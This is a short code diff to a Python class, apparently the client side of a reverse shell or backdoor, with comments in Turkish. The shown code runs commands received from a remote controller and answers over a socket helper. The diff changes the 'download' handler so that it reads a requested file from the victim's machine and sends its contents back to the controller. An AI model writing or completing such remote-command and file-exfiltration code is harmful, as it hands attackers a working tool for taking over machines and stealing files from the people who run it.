@@ -47,7 +47,7 @@ class ihsanbey:
 
     def read_file(self, path):
         #with open(path, "rb+") as file:
-        with open(path, "+rb") as file:
+        with open(path, "rb+") as file:
             x = file.read()
             print(x)
             return x 
@@ -68,10 +68,12 @@ class ihsanbey:
                     self.reliable_send(command_result)
                 except FileNotFoundError:
                     return print("Eksik dosya ismi / dosya bulunamadı")
-            elif command.startswith("download "):
+                
+            elif command.startswith("download"):
                 wanted_file_command = command.split(" ")
                 print(wanted_file_command) #dosyanın içinde olanları yazdır ki doğru çalışıyor mu gör
                 command_result = self.read_file(wanted_file_command[1])
+                self.reliable_send(command_result)
             else:
                 try:    
                     resultt = self.execute_command(command.encode("utf-8"))
